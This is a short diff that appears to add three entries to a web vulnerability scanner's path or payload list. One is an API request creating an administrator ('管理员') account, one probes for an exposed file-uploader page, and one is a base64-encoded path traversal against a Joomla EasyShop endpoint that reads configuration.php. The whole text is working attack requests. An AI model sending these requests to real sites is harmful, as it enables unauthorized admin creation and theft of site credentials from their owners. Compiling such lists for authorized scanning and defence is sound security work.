@@ -1,0 +1,3 @@
+/api/v1/user/save?ID=&Username={{user}}&Role=管理员&Enable=true
+/Content/Plugins/uploader/FileChoose.html
+/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=
